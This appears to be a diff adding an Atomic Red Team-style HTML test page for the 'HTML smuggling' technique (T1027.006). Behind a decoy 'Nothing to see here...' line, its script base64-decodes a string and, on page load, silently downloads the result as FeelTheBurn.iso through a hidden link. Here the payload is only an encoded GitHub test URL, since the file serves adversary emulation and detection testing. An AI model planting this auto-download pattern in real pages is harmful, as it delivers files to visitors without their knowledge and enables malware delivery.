@@ -1,0 +1,36 @@
+<!-- Based on the template from Stan Hegt: https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ -->
+<html>
+    <head>
+        <title>T1027.006 - HTML Smuggling</title>
+    </head>
+    <body>
+        <p>Nothing to see here...</p>
+
+        <script>
+        function convertFromBase64(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array( len );
+            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+            return bytes.buffer;
+        }
+        //Base64 encoded link to https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso
+        var file ='aHR0cHM6Ly9naXRodWIuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9ibG9iL2QwZGFkNjJkYmNhZTljNjBjNTE5MzY4ZTgyYzE5NmEzZGI1NzcwNTUvYXRvbWljcy9UMTU1My4wMDUvYmluL0ZlZWxUaGVCdXJuLmlzbz9yYXc9dHJ1ZQ==';
+        var data = convertFromBase64(file);
+        var blob = new Blob([data], {type: 'octet/stream'});
+        var fileName = 'FeelTheBurn.iso';
+
+        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
+        else {
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            var url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = fileName;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+        </script>
+    </body>
+</html>
